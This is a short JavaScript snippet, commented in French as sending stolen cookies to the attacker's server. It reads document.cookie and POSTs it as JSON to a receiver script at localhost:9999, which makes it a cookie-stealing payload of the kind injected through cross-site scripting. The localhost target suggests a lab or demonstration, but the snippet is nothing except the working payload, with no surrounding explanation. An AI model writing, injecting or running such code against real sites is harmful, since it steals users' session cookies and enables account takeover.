// Envoyer les cookies volés au serveur attaquant
fetch("http://localhost:9999/receiver.php", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ cookies: document.cookie })
});